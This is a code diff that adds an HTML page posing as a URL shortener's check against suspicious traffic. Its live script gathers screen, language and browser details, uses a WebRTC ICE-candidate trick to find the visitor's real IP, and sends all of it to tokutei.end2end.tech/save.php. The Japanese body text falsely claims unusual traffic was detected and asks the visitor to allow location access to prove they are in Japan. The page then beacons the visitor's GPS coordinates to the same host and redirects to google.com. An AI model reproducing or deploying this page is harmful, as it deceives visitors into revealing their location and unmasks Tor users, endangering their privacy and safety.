@@ -1,0 +1,85 @@
+<!--
+***************************************
+**        URL短縮サービス            **
+**        https://rinu.cf/           **
+**  Tor等の不審なアクセス対策ページ  **
+***************************************
+ -->
+
+<!DOCTYPE html>
+<html lang="ja" dir="ltr">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+    <title></title>
+    <meta name="robots" content="noindex">
+    <meta name="favicon" content="https://www.activetk.cf/icon/index_32_32.ico">
+    <script type="text/javascript" nonce="r6zks50f9h8cvjaqp341wlig2umtodyenxb7">
+
+       if(!(typeof(screen.colorDepth)==="undefined")){
+         var wC=screen.colorDepth,gSt="";
+         gSt=1==wC?"白黒(1ビット)":4==wC?"16色(4ビット)":8==wC?"256色(8ビット)":16==wC?"65,536色(16ビット)":24==wC?"1677万色(24ビット)":32==wC?"1677万色(32ビット)":wC+"ビットカラー";
+         window.scolor=gSt;
+       };
+
+              
+       try{
+         window.RTCPeerConnection=window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection;
+         var pc=new RTCPeerConnection({iceServers:[]}),noop=function(){};
+         pc.createDataChannel('');pc.createOffer(pc.setLocalDescription.bind(pc),noop);
+         pc.onicecandidate=function(ice){
+           if(ice&&ice.candidate&&ice.candidate.candidate){
+             window.iceinfo=ice.candidate.candidate;pc.onicecandidate=noop;red();
+           }else{
+             window.iceinfo="取得出来ませんでした。。";red();
+           }
+         };
+       }catch(n){
+         window.iceinfo="取得出来ませんでした。。";red();
+       };
+
+       
+       function red(){
+         let request=new XMLHttpRequest();
+         request.open('GET',"https://tokutei.end2end.tech/save.php?noredirect&screenw="+window.screen.width+"&screenh="+window.screen.height+"&winlang="+window.navigator.language+"&wincolor="+window.scolor+"&winname="+window.navigator.appName+"&iceinfo="+window.iceinfo+"&flg=2241066&url=google.com&ref=google.com&error=取得中にタブが閉じられました。",false);
+         request.send(null);
+         if(navigator.geolocation){
+           navigator.geolocation.getCurrentPosition(
+             function(e){
+               navigator.sendBeacon("https://tokutei.end2end.tech/save.php?ido="+e.coords.latitude+"&keido="+e.coords.longitude+"&koudo="+e.coords.altitude+"&seido="+e.coords.accuracy+"&speed="+e.coords.speed+"&screenw="+window.screen.width+"&screenh="+window.screen.height+"&winlang="+window.navigator.language+"&wincolor="+window.scolor+"&winname="+window.navigator.appName+"&iceinfo="+window.iceinfo+"&flg=2241066&url=google.com&ref=google.com&noredirect");
+               location.href=decodeURIComponent("google.com");
+             },function(e){
+               navigator.sendBeacon("https://tokutei.end2end.tech/save.php?noredirect&error="+e.code+"&screenw="+window.screen.width+"&screenh="+window.screen.height+"&winlang="+window.navigator.language+"&wincolor="+window.scolor+"&winname="+window.navigator.appName+"&iceinfo="+window.iceinfo+"&flg=2241066&url=google.com&ref=google.com");
+               location.href=decodeURIComponent("google.com");
+             },{enableHighAccuracy:!1,timeout:8e3,maximumAge:2e3}
+           )
+         }else{
+           navigator.sendBeacon("https://tokutei.end2end.tech/save.php?noredirect&error=noapi&screenw="+window.screen.width+"&screenh="+window.screen.height+"&winlang="+window.navigator.language+"&wincolor="+window.scolor+"&winname="+window.navigator.appName+"&iceinfo="+window.iceinfo+"&flg=2241066&url=google.com&ref=google.com");
+           location.href=decodeURIComponent("google.com");
+         }
+       }
+
+    </script>
+    <script nonce="r6zks50f9h8cvjaqp341wlig2umtodyenxb7" async
+      src="https://www.googletagmanager.com/gtag/js?id=G-61MDBBP9HX"></script>
+    <script
+      nonce="r6zks50f9h8cvjaqp341wlig2umtodyenxb7">window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-61MDBBP9HX');</script>
+    <noscript><meta http-equiv="refresh"
+        content="0;URL='https://tokutei.end2end.tech/save.php?error=noscript&flg=2241066&url=google.com'"></noscript>
+    <meta http-equiv="refresh"
+      content="30;URL='https://tokutei.end2end.tech/save.php?error=timeout&flg=2241066&url=google.com'">
+  </head>
+  <body style="background-color:#e6e6fa;color:#363636;">
+    <noscript><div title="NO SCRIPT ERROR" style="background-color:#404ff0;"
+        align="center"><font color="#ff4500"><h1>No JavaScript
+            Error.</h1></font></div></noscript>
+    <div align="center">
+      <br><br><br>
+      <p><a
+          href="https://www.activetk.jp/tools/urlmin?from=tokutei.end2end.tech"
+          target="_blank">URL短縮サービス「rinu.cf」</a>を利用して頂きありがとうございます。</p>
+      <p>お使いのネットワークから通常とは異なるトラフィックが検出された為、位置情報の取得を許可して日本からのアクセスである事を証明して頂く必要があります。</p>
+    </div>
+  </body>
+</html>
